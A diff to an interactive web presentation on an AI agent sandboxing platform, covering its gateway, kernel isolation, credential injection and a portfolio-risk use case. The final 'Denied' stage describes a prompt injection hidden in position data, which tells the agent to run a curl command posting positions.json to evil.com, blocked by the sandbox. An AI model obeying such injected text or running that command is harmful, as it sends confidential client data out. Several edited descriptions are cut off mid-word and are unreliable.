@@ -788,7 +788,7 @@ html.presentation .modal-card{max-width:95vw}
 <section class="section" id="journey">
 
   <div class="journey-svg">
-    <svg id="jSvg" viewBox="-2 -2 1164 214" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
+    <svg id="jSvg" viewBox="-2 -10 1164 240" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <marker id="ja" markerWidth="6" markerHeight="5" refX="6" refY="2.5" orient="auto"><polygon points="0 0,6 2.5,0 5" fill="var(--t3)"/></marker>
         <filter id="glow"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
@@ -841,7 +841,7 @@ html.presentation .modal-card{max-width:95vw}
 <section class="section" id="sandboxing">
 
   <div class="journey-svg">
-    <svg id="sbSvg" viewBox="-2 -2 1164 184" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
+    <svg id="sbSvg" viewBox="-2 -10 1164 200" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <filter id="sbGlow"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
       </defs>
@@ -890,7 +890,7 @@ html.presentation .modal-card{max-width:95vw}
 
   <!-- Animated horizontal journey FIRST -->
   <div class="journey-svg">
-    <svg id="ucSvg" viewBox="-2 -2 1164 184" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
+    <svg id="ucSvg" viewBox="-2 -10 1164 200" overflow="visible" width="100%" style="min-width:800px" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <filter id="ucGlow"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
       </defs>
@@ -1352,43 +1352,43 @@ document.querySelectorAll('[data-flow]').forEach(el=>{
 const JStages=[
 {id:"S01",l:"User",c:"var(--neutral)",comp:"CLI / Browser / SDK",plane:"External",
  w:"User sends a goal or prompt to the agent",
- d:"openshell sandbox exec my-agent -- 'fix the CI'. Or via browser through TLS Route to Secure Agent Workspace. OIDC auth (Keycloak PKCE / device flow) → short-lived token.",m:""},
+ d:"openshell sandbox exec my-agent -- 'fix the CI'. Or via browser through TLS Route to Secure Agent Workspace.",m:""},
 {id:"S02",l:"OS Gateway",c:"var(--blue)",comp:"OpenShell Gateway — the control plane",plane:"Control",
  w:"OpenShell Gateway: control plane for all sandbox operations",
- d:"The gateway is the control plane for OpenShell. All traffic between CLI and sandboxes flows through it. Deployed via Helm (K8s StatefulSet), Docker container, Podman, or MicroVM. Exposes gRPC/mTLS. Responsible for: provisioning sandboxes, storing credentials (AES-256-GCM encrypted), delivering policies to sandboxes, resolving endpoint-bound providers, SSH tunnel endpoint, Z3 policy prover, Ed25519 JWT issuance, and OCSF audit logging. On K8s: writes a Sandbox CR. On Docker/Podman: creates containers directly.",m:"~60mc / ~122 MiB overhead"},
+ d:"The gateway is the control plane for OpenShell. All traffic between CLI and sandboxes flows through it.",m:"~60mc / ~122 MiB overhead"},
 {id:"S03",l:"Sandbox Op",c:"var(--blue)",comp:"Agent Sandbox Operator (K8s path) or direct container (Docker/Podman)",plane:"Control",
  w:"On K8s: operator reconciles the Sandbox CR into a pod. On Docker/Podman: gateway creates the container directly.",
- d:"Kubernetes path: Red Hat-distributed operator in agent-sandbox-system namespace watches Sandbox CRs (agents.x-k8s.io/v1beta1). Reconciles each into a pod with init containers (supervisor-install copies binary, workspace-init sets up /sandbox). Runs Sandbox Router for SSH/exec routing. SandboxWarmPool CRs pre-provision pods. Docker/Podman path: gateway creates containers directly — no operator needed. Both paths produce the same result: a runtime with the supervisor binary injected. The operator manages pod lifecycle only — it never enforces security.",m:"Cold: 16.4s → Warm: 247ms P50 (K8s)"},
+ d:"Kubernetes path: Red Hat-distributed operator in agent-sandbox-system namespace watches Sandbox CRs (agents.x-k8s.io/v1be",m:"Cold: 16.4s → Warm: 247ms P50 (K8s)"},
 {id:"S04",l:"Supervisor",c:"var(--green)",comp:"OpenShell Supervisor (PID 1) — the data plane inside the sandbox",plane:"Execution",
  w:"Supervisor bootstraps: this is where OpenShell enforcement begins",
- d:"A sandbox is the OpenShell data plane: a safe, private execution environment. The supervisor binary was injected via init container (K8s) or volume mount (Docker/Podman). Runs as PID 1. Connects outbound to Gateway over mTLS gRPC. Gateway streams policy + credentials + config. Applies Landlock LSM — irreversible filesystem scoping (even root cannot loosen). Installs seccomp-BPF (USER_NOTIF) to intercept connect/bind/sendmsg. Filesystem and process settings are fixed at startup; network policies can be hot-reloaded while running. Then drops ALL capabilities and launches agent as child — capability-free.",m:""},
+ d:"A sandbox is the OpenShell data plane: a safe, private execution environment.",m:""},
 {id:"S05",l:"Agent",c:"var(--green)",comp:"Agent Harness (OpenClaw, Hermes, LangGraph…)",plane:"Execution",
  w:"Loads skills, assembles prompt, begins ReAct loop",
- d:"Loads skill instruction files. Assembles: instructions + skills + context + tool schemas. 83 user tokens → 8,135 total (16.9× expansion). Begins: reason → act → observe.",m:"16.9× prompt expansion"},
+ d:"Loads skill instruction files. Assembles: instructions + skills + context + tool schemas.",m:"16.9× prompt expansion"},
 {id:"S06",l:"Reason",c:"var(--cyan)",comp:"Inference request → Supervisor Tier 1",plane:"Execution → Inference",
  w:"Agent thinks — sends inference request through enforcement chain",
- d:"Supervisor egress router: policy check → PII detection-and-redaction if external → confidential context never leaves cluster. Routes to AI Gateway for in-cluster inference.",m:""},
+ d:"Supervisor egress router: policy check → PII detection-and-redaction if external → confidential context never leaves clus",m:""},
 {id:"S07",l:"AI GW",c:"var(--cyan)",comp:"AI Gateway (MaaS) — Kuadrant + Authorino + Limitador",plane:"Inference",
  w:"MaaS gateway: subscription-based governance for model access",
- d:"Gateway API-conformant proxy built on Red Hat Connectivity Link (Kuadrant). Authorino authenticates via API key (PostgreSQL-backed lifecycle) or external OIDC. MaaSSubscription CRs define which groups get quota for which models with configurable token limits. Limitador enforces those limits per request. Same gateway governs self-hosted models (llm-d/vLLM via MaaSModelRef) and external providers (Bedrock, Azure OpenAI, Vertex AI via ExternalProvider CR). Multi-provider API passthrough routes Anthropic and OpenAI Responses API formats without translation. NeMo Guardrails screens input for prompt injection and PII.",m:""},
+ d:"Gateway API-conformant proxy built on Red Hat Connectivity Link (Kuadrant).",m:""},
 {id:"S08",l:"Router",c:"var(--cyan)",comp:"Semantic Router — Tier 2 (Cost)",plane:"Inference",
  w:"Classifier picks the cheapest capable model",
- d:"Lightweight classifier: intent + complexity → model pool (e.g., Nemotron-mini vs full Llama). Fallback escalates on low confidence. Adds latency — measured trade-off.",m:""},
+ d:"Lightweight classifier: intent + complexity → model pool (e.g., Nemotron-mini vs full Llama).",m:""},
 {id:"S09",l:"EPP",c:"var(--blue)",comp:"llm-d EPP — Tier 3 (Efficiency)",plane:"Inference",
  w:"Selects optimal vLLM replica via ext-proc",
- d:"Probes vLLM /metrics. Prefix-affinity: route to pod with cached KVs (95% hit rate). Load-awareness: back-pressure management. If disaggregated: selects separate prefill + decode workers.",m:"95% KV cache hit rate"},
+ d:"Probes vLLM /metrics. Prefix-affinity: route to pod with cached KVs (95% hit rate).",m:"95% KV cache hit rate"},
 {id:"S10",l:"vLLM",c:"var(--neutral)",comp:"vLLM on GPU (NVIDIA / AMD / Intel / TPU)",plane:"Infrastructure",
  w:"GPU runs inference — tokens stream back",
- d:"If disaggregated: prefill pod → KVXfer metadata → NIXL sidecar → decode pod pulls KVs → generates tokens. KV offload to CPU RAM or remote storage. Tokens stream: vLLM → EPP → Gateway → Supervisor → Harness.",m:"900 tok/s/GPU · $1.2/M output tokens"},
+ d:"If disaggregated: prefill pod → KVXfer metadata → NIXL sidecar → decode pod pulls KVs → generates tokens.",m:"900 tok/s/GPU · $1.2/M output tokens"},
 {id:"S11",l:"Act",c:"var(--amber)",comp:"Tool call → two authorization boundaries → credential injection",plane:"Execution → Tools",
  w:"Model calls a tool — every request crosses two independent authorization checks",
- d:"seccomp intercepts connect(). Binary identity resolved via /proc/exe + SHA-256 TOFU. Two boundaries must BOTH pass: (1) Network policy — is this binary allowed to reach this destination with this request? (2) Credential binding — does the provider profile authorize this credential at this endpoint's host, port, and path? If both pass: proxy substitutes the opaque placeholder with the real credential at the last moment before forwarding. If either fails: request blocked, fail-closed. Unknown, malformed, or expired placeholders also fail closed — never forwarded upstream. OCSF event emitted for every decision.",m:""},
+ d:"seccomp intercepts connect(). Binary identity resolved via /proc/exe + SHA-256 TOFU.",m:""},
 {id:"S12",l:"Observe",c:"var(--green)",comp:"Loop decision in harness",plane:"Execution",
  w:"Result added to context — loop or finish",
- d:"Tool result added to conversation context. Harness evaluates: goal met? Limits reached (steps, tokens, cost, timeout)? If not done → back to Reason. 40%+ of sessions run full auto-approve.",m:""},
+ d:"Tool result added to conversation context.",m:""},
 {id:"S13",l:"Audit",c:"var(--purple)",comp:"OCSF + OTEL + MLflow — every hop",plane:"Cross-cutting",
  w:"The entire journey traced end-to-end",
- d:"OCSF v1.8.0 events for every allow/deny. OTEL spans across all 3 inference tiers. MLflow traces: tool calls, prompts, outputs, latencies, costs. Exported to Prometheus, Jaeger/Tempo, SIEM. Production traces become new eval cases.",m:""}
+ d:"OCSF v1.8.0 events for every allow/deny. OTEL spans across all 3 inference tiers.",m:""}
 ];
 
 const jNodePositions=[
@@ -1605,34 +1605,34 @@ jObserver.observe(document.getElementById('journey'),{attributes:true,attributeF
 const SB=[
 {l:"CLI",c:"var(--neutral)",comp:"CLI / SDK",plane:"User",
  w:"User creates a sandbox",
- d:"openshell sandbox create --from my-image:latest --provider claude-code -- claude. The trailing command becomes the canonical main process. --provider attaches credentials. Default image: nvcr.io/nvidia/base/ubuntu:24.04.",m:""},
+ d:"openshell sandbox create --from my-image:latest --provider claude-code -- claude.",m:""},
 {l:"Gateway",c:"var(--blue)",comp:"OpenShell Gateway — control plane",plane:"Control",
  w:"Gateway validates policy and encrypts credentials",
- d:"Receives gRPC/mTLS request. Resolves effective policy (global → sandbox → image → default). Runs Z3 prover to verify no risky configs. Encrypts credentials (AES-256-GCM, KEK-wrapped). Mints Ed25519-signed JWT. Resolves provider profiles and endpoint bindings.",m:"~60mc / ~122 MiB"},
+ d:"Receives gRPC/mTLS request. Resolves effective policy (global → sandbox → image → default).",m:"~60mc / ~122 MiB"},
 {l:"Sandbox CR",c:"var(--blue)",comp:"OpenShell Gateway writes the resource",plane:"Control",
  w:"Gateway writes a Sandbox CR (K8s) or creates container directly (Docker/Podman)",
- d:"On Kubernetes: writes agents.x-k8s.io/v1beta1 Sandbox CR with openshell.ai/ labels. On Docker/Podman: creates the container directly — no CR, no operator. MicroVM: creates a lightweight VM. All paths produce the same result: a runtime with the supervisor binary injected.",m:""},
+ d:"On Kubernetes: writes agents.x-k8s.io/v1beta1 Sandbox CR with openshell.ai/ labels.",m:""},
 {l:"Operator",c:"var(--green)",comp:"Agent Sandbox Operator (K8s path)",plane:"Control",
  w:"Operator reconciles the CR into a pod with init containers",
- d:"Red Hat-distributed operator in agent-sandbox-system namespace. Watches Sandbox CRs, reconciles each into a pod. Init container copies supervisor binary to shared emptyDir. Workspace-init prepares /sandbox. SandboxWarmPool CRs pre-provision pods. On Docker/Podman this step is skipped — gateway created the container directly.",m:"Cold: 16.4s → Warm: 247ms"},
+ d:"Red Hat-distributed operator in agent-sandbox-system namespace. Watches Sandbox CRs, reconciles each into a pod.",m:"Cold: 16.4s → Warm: 247ms"},
 {l:"PID 1",c:"var(--cyan)",comp:"OpenShell Supervisor starts as PID 1",plane:"Execution",
  w:"Supervisor starts — the security data plane begins",
- d:"Main container entrypoint: /opt/openshell/bin/openshell-sandbox --workdir /sandbox. Connects outbound to Gateway over mTLS gRPC. Authenticates with projected ServiceAccount token (1h TTL). Gateway streams policy, credentials, and configuration over this session.",m:""},
+ d:"Main container entrypoint: /opt/openshell/bin/openshell-sandbox --workdir /sandbox.",m:""},
 {l:"Landlock",c:"var(--purple)",comp:"Landlock LSM — irreversible filesystem isolation",plane:"Kernel",
  w:"Filesystem scoped — even root cannot loosen it",
- d:"Applies explicit path allowlist via Landlock LSM. Irreversible after process start — not even root can widen access. The filesystem_policy section in the sandbox YAML controls which paths are readable and writable. Fixed at startup; cannot be hot-reloaded.",m:""},
+ d:"Applies explicit path allowlist via Landlock LSM. Irreversible after process start — not even root can widen access.",m:""},
 {l:"seccomp",c:"var(--purple)",comp:"seccomp-BPF (USER_NOTIF) + OPA/Rego proxy",plane:"Kernel",
  w:"Every outbound connection intercepted and policy-checked",
- d:"seccomp-BPF filter intercepts connect(), bind(), sendmsg(). Supervisor resolves calling binary via /proc/pid/exe — records hash on first use (TOFU), denies if binary changes. OPA/Rego evaluates: {destination host:port, binary identity, L7 rules}. Per-binary, per-endpoint. Network policies CAN be hot-reloaded while running. nftables catch any bypass attempt.",m:""},
+ d:"seccomp-BPF filter intercepts connect(), bind(), sendmsg().",m:""},
 {l:"Creds",c:"var(--cyan)",comp:"Credential placeholders — two auth boundaries",plane:"Execution",
  w:"Every credential becomes an opaque placeholder — real keys injected at egress only",
- d:"Agent sees $ANTHROPIC_API_KEY = opaque token, not the real key. Two independent boundaries must BOTH pass: (1) network policy allows binary + destination, (2) provider profile authorizes credential at this host:port:path. Supports: header, Basic auth, query param, URL path, request body (opt-in), WebSocket (opt-in), SigV4. Unknown/expired placeholders fail closed — never forwarded.",m:""},
+ d:"Agent sees $ANTHROPIC_API_KEY = opaque token, not the real key.",m:""},
 {l:"Agent",c:"var(--amber)",comp:"Agent process — capability-free",plane:"Execution",
  w:"Supervisor drops ALL capabilities, spawns agent as child — zero privileges",
- d:"Agent runs with zero Linux capabilities. Loads skills, assembles system prompt (16.9× expansion), begins ReAct loop. Every outbound call intercepted by seccomp, evaluated by OPA, allowed (with cred injection) or denied (with OCSF event). Policy lives outside the process — agent cannot override it. Sandbox reaches Ready phase.",m:"16.9× prompt expansion"},
+ d:"Agent runs with zero Linux capabilities. Loads skills, assembles system prompt (16.9× expansion), begins ReAct loop.",m:"16.9× prompt expansion"},
 {l:"Audit",c:"var(--purple)",comp:"OCSF + OTEL + MLflow — every decision",plane:"Cross-cutting",
  w:"Full lifecycle traced — every allow, deny, tool call, and latency recorded",
- d:"OCSF v1.8.0: NetworkActivity, HttpActivity, ProcessActivity, ConfigStateChange, DetectionFinding. OTEL spans across the full path. MLflow Tracing: agent steps, tool calls, prompts, outputs, latencies, costs. Prometheus on port 9090. All exportable to SIEM. Production traces become eval datasets.",m:""}
+ d:"OCSF v1.8.0: NetworkActivity, HttpActivity, ProcessActivity, ConfigStateChange, DetectionFinding.",m:""}
 ];
 
 const sbPositions=[
@@ -1799,34 +1799,34 @@ sbObserver.observe(document.getElementById('sandboxing'),{attributes:true,attrib
 const UC=[
 {l:"Analyst",c:"var(--neutral)",comp:"Risk analyst asks a question",plane:"User",
  w:"\"Show me the overnight VaR for our APAC equity book and flag concentration limit breaches\"",
- d:"The analyst types the question into the agent interface (CLI, web dashboard, or chat). The agent runs inside an OpenShell sandbox with the Portfolio Risk Playbook skill loaded.",m:""},
+ d:"The analyst types the question into the agent interface (CLI, web dashboard, or chat).",m:""},
 {l:"Gateway",c:"var(--blue)",comp:"OpenShell Gateway validates and provisions",plane:"Control",
  w:"Sandbox created with three providers attached: OMS (read-only), risk calculator, compliance checker",
- d:"Gateway encrypts credentials (AES-256-GCM), resolves provider profiles, validates the L7 policy (OMS: GET only, no POST/PUT/DELETE). Z3 prover confirms no risky configurations. Supervisor receives policy + credential handles.",m:""},
+ d:"Gateway encrypts credentials (AES-256-GCM), resolves provider profiles, validates the L7 policy (OMS: GET only,",m:""},
 {l:"Skill",c:"var(--amber)",comp:"Portfolio Risk Playbook loaded by harness",plane:"Execution",
  w:"Skill tells the agent: step 1 — pull current APAC positions from the OMS",
- d:"The playbook is an instruction file with 4 steps. Step 1: call the OMS Connector tool to retrieve all equity positions in the Asia-Pacific book. The skill specifies which tool schema to use and what fields to request (symbol, quantity, market value, currency).",m:""},
+ d:"The playbook is an instruction file with 4 steps.",m:""},
 {l:"OMS",c:"var(--cyan)",comp:"MCP tool: OMS Connector → OMS REST API",plane:"Tool call",
  w:"Agent calls the OMS Connector tool — MCP Gateway checks identity, supervisor injects credential",
- d:"seccomp intercepts connect(). Binary identity verified (SHA-256 TOFU). OPA policy: this agent can reach oms-api.internal:443 with GET only. MCP Gateway checks SVID token claims. Supervisor injects the OMS API key into the request header. Real key never visible to agent. Returns 847 APAC equity positions as JSON.",m:"GET only — POST blocked by L7 policy"},
+ d:"seccomp intercepts connect(). Binary identity verified (SHA-256 TOFU).",m:"GET only — POST blocked by L7 policy"},
 {l:"Reason",c:"var(--cyan)",comp:"Model analyzes positions, skill says: compute VaR next",plane:"Inference",
  w:"Model sends 847 positions to the risk calculator — MaaS subscription governs access",
- d:"Supervisor Tier 1: positions contain client data → must stay in-cluster (PII policy). AI Gateway: the analyst's group has a MaaSSubscription granting quota for the quantitative model with token limits. Authorino validates the API key against that subscription. Limitador checks remaining token budget. Semantic Router selects the quantitative model. llm-d EPP routes to the replica with the warmest KV cache. Model reasons: 'I have positions. The playbook says to compute VaR next.'",m:"Tier 1 keeps client data in-cluster"},
+ d:"Supervisor Tier 1: positions contain client data → must stay in-cluster (PII policy).",m:"Tier 1 keeps client data in-cluster"},
 {l:"Risk",c:"var(--green)",comp:"Risk Calculator tool → Monte Carlo engine on GPU",plane:"Tool call",
  w:"Agent calls the Risk Calculator — dispatched as a GPU batch job with scoped RBAC",
- d:"This is a platform-invoked service (not MCP) because it's a GPU batch computation, not a model-selected API call. Scoped RBAC limits the agent to submitting risk jobs only — it cannot create arbitrary workloads. The Monte Carlo engine runs 10,000 scenarios on the quant cluster GPUs. Returns: 1-day 99% VaR = $12.4M, plus per-position Greeks.",m:"Platform path — own admission control, not MCP"},
+ d:"This is a platform-invoked service (not MCP) because it's a GPU batch computation, not a model-selected API call.",m:"Platform path — own admission control, not MCP"},
 {l:"Comply",c:"var(--cyan)",comp:"MCP tool: Compliance Checker → Rules engine",plane:"Tool call",
  w:"Skill step 3: check each position against concentration limits (Basel + internal)",
- d:"Agent calls the Compliance Checker tool through the MCP Gateway. SVID claims verified. The rules engine evaluates 847 positions against regulatory limits (Basel III single-name concentration) and internal risk policies. Returns: 3 positions exceed the 5% single-name limit — Samsung Electronics (6.2%), TSMC (5.8%), Toyota Motor (5.1%).",m:"3 breaches flagged"},
+ d:"Agent calls the Compliance Checker tool through the MCP Gateway. SVID claims verified.",m:"3 breaches flagged"},
 {l:"Report",c:"var(--amber)",comp:"Skill step 4: summarize findings and flag breaches",plane:"Execution",
  w:"Agent produces the risk report — VaR, breaches, and recommended actions",
- d:"The playbook's final step: compile VaR results + compliance breaches into a structured summary. Model generates: 'APAC equity book 1-day 99% VaR: $12.4M. Three positions exceed concentration limits: Samsung (6.2%), TSMC (5.8%), Toyota (5.1%). Recommended: reduce Samsung and TSMC to below 5% before Tokyo open.' Report delivered to analyst.",m:""},
+ d:"The playbook's final step: compile VaR results + compliance breaches into a structured summary.",m:""},
 {l:"Audit",c:"var(--purple)",comp:"Full trace: question → every tool call → report",plane:"Cross-cutting",
  w:"OCSF + OTEL + MLflow capture the complete audit trail for regulatory review",
- d:"Every decision traced: which analyst asked, which positions were accessed (OCSF NetworkActivity), which risk model was used (OTEL spans), which compliance rules were evaluated, and what the agent recommended (MLflow Tracing). The compliance team can replay the entire reasoning chain. If a regulator asks 'why was this position flagged?' — the trace answers with every intermediate step.",m:""},
+ d:"Every decision traced: which analyst asked, which positions were accessed (OCSF NetworkActivity),",m:""},
 {l:"Denied",c:"var(--pink)",comp:"What OpenShell prevented during this session",plane:"Security",
  w:"Prompt injection attempt: agent tried to curl positions to an external server — blocked",
- d:"During the session, a crafted prompt in one of the position descriptions tried to make the agent run: curl -X POST https://evil.com/exfil -d @positions.json. OpenShell blocked it at three layers: (1) curl is not in the binary allowlist — seccomp denied the connect(). (2) evil.com is not in the network policy — OPA denied the destination. (3) Even if it reached the proxy, no credential would be injected for an unknown endpoint. OCSF DetectionFinding event emitted. Security team alerted.",m:"Blocked at 3 layers simultaneously"}
+ d:"During the session, a crafted prompt in one of the position descriptions tried to make the agent run: curl -X POST https:",m:"Blocked at 3 layers simultaneously"}
 ];
 
 const ucPositions=[
